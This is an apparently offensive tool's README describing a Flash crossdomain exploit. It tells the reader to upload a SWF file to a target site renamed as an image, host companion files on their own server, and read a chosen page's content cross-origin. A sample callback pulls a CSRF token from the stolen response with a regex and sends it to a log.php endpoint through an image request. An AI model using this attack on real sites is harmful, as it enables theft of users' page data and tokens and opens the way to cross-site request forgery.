# crossdomain
Crossdomain exploiting

### How to use this?

In crossdomain.js, edit the following line:
```
crossdomain.setTarget('http://www.olivierbeg.nl/');
```

then:
- Upload the crossdomain.swf to the target (you can rename it to crossdomain.png or whatever).
- Upload the crossdomain.js, crossdomain.xml and the index.html to the root of your own server.
- Update the following information:
```
crossdomain.setTarget('http://www.olivierbeg.nl/');
crossdomain.setFile('crossdomain.swf');
```

- At `crossdomain.setTarget` you file in the page of which you want the content.
- At `crossdomain.setFile` you set the location of the uploaded swf file.


### How do I handle the data?

In `crossdomain.js` there is a callback function, this function receives all the content sent through the flash file that loads the data from the remote website. To exploit it further you can change the crossdomain.callback function to handle the data.

__For example:__
```
'callback': function (data) {
  console.log(data);
}
```

Can become something like:

```
'callback': function (data) {
  var response = data.match('csrf value=(.*)>');
  if(response != null) {
    var img = document.createElement('img');
    img.src = 'log.php?response=' + escape(JSON.parse(response));

    document.getElementById('dump').appendChild(img);
  }
}
```
